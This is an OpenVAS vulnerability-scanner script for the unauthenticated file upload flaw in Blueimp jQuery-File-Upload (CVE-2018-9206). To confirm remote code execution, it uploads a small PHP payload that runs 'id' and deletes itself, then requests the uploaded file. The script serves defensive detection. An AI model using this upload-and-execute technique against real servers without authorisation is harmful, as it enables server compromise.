###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_jquery_file_upload.nasl 12194 2018-11-02 05:40:59Z ckuersteiner $
#
# Blueimp jQuery-File-Upload < 9.24.1 File Upload Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141641");
  script_version("$Revision: 12194 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-02 06:40:59 +0100 (Fri, 02 Nov 2018) $");
  script_tag(name:"creation_date", value:"2018-11-02 10:28:49 +0700 (Fri, 02 Nov 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2018-9206");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Blueimp jQuery-File-Upload < 9.24.1 File Upload Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80, 443);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Blueimp jQuery-File-Upload is prone to a unauthenticated file upload
vulnerability.");

  script_tag(name:"affected", value:"Blueimp jQuery-File-Upload prior to version 9.24.1.");

  script_tag(name:"solution", value:"Update to version 9.24.1 or later.");

  script_tag(name:"vuldetect", value:"Tries to upload a PHP file and execute the 'id' command.");

  script_xref(name:"URL", value:"http://www.vapidlabs.com/advisory.php?v=204");
  script_xref(name:"URL", value:"https://github.com/blueimp/jQuery-File-Upload/blob/master/VULNERABILITIES.md#remote-code-execution-vulnerability-in-the-php-component");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default: 80);

if (!can_host_php(port: port))
  exit(0);

vt_strings = get_vt_strings();
bound = '------------------------' + vt_strings["default"];
file = vt_strings["default_rand"] + ".php";

post_data = '--' + bound + '\r\n' +
            'Content-Disposition: form-data; name="files[]"; filename="' + file + '"\r\n' +
            'Content-Type: application/octet-stream\r\n\r\n' +
            '<?php system(id); unlink(__FILE__); ?>\r\n\r\n' +
            '--' + bound + '--\r\n';

paths = make_array("/server/php/upload.class.php", "/server/php/index.php",
                   "/example/upload.php", "/example/upload.php",
                   "/server/php/UploadHandler.php", "/server/php/index.php",
                   "/php/index.php", "/php/index.php",
                   "/jQuery-File-Upload/server/php/upload.class.php", "/jQuery-File-Upload/server/php/index.php",
                   "/jQuery-File-Upload/example/upload.php", "/jQuery-File-Upload/example/upload.php",
                   "/jQuery-File-Upload/server/php/UploadHandler.php", "/jQuery-File-Upload/server/php/index.php",
                   "/jQuery-File-Upload/php/index.php", "/jQuery-File-Upload/php/index.php");

headers = make_array("Content-Type", "multipart/form-data; boundary=" + bound);

foreach dir (make_list_unique("/", cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  foreach path (keys(paths)) {
    url = dir + path;
    req = http_get(port: port, item: url);
    res = http_keepalive_send_recv(port: port, data: req);

    if (res =~ "^HTTP/1\.[01] 200") {
      found_url = url;
      url = dir + paths[path];
      req = http_post_req(port: port, url: url, data: post_data, add_headers: headers);
      res = http_keepalive_send_recv(port: port, data: req);

      url = eregmatch(pattern: '"url":"([^"]+)"', string: res);
      if (!isnull(url[1])) {
        url = str_replace(string: url[1], find: "\", replace: "");

        req = http_get(port: port, item: url);
        res = http_keepalive_send_recv(port: port, data: req);

        if (res =~ 'uid=[0-9]+.*gid=[0-9]+') {
          report = 'It was possible to upload a PHP file and execute the "id" command.\n' +
                   'Found vulnerable URL at ' + report_vuln_url(port: port, url: found_url, url_only: TRUE) +
                   '\n\nResult:\n' + egrep(pattern: 'uid=[0-9]+.*gid=[0-9]+.*', string: res);
          security_message(port: port, data: report);
          exit(0);
        }
      }
    }
  }
}

exit(99);
